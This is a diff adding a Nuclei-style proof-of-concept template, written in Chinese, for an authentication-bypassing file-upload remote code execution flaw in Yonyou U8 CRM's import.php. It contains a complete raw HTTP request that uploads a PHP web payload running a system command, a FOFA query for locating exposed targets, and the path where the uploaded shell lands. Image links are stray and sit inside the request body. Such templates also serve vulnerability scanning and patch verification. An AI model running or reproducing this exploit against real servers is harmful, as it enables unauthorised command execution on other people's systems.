@@ -1,0 +1,55 @@
+id: poc-ui87yibnsd339sci
+info:
+  name: 用友U8 CRM import.php 文件上传致RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ui87yibnsd339sci'
+  tags: rce,file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ui87yibnsd339sci
+    fofa: title="用友U8CRM"
+http:
+- raw:
+  - 'POST /crmtools/tools/import.php?DontCheckLogin=1&issubmit=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye0z8QbHs79gL8vW5
+
+    ------WebKitFormBoundarye0z8QbHs79gL8vW5
+
+    Content-Disposition: form-data; name="xfile"; filename="1.xls"
+
+    <?php system("whoami");unlink(__FILE__);?>
+
+    ------WebKitFormBoundarye0z8QbHs79gL8vW5
+
+    Content-Disposition: form-data; name="combo"
+
+    rce.php
+
+    ------WebKitFormBoundarye0z8QbHs79gL8vW5--
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1722244558100-223d2c1c-f5b2-477c-a828-9e7d470d672e.png)
+
+    上传定位
+
+    /tmpfile/rce.php
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1722244558396-590f57da-5ec0-49d1-957b-ff6c1dd76219.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
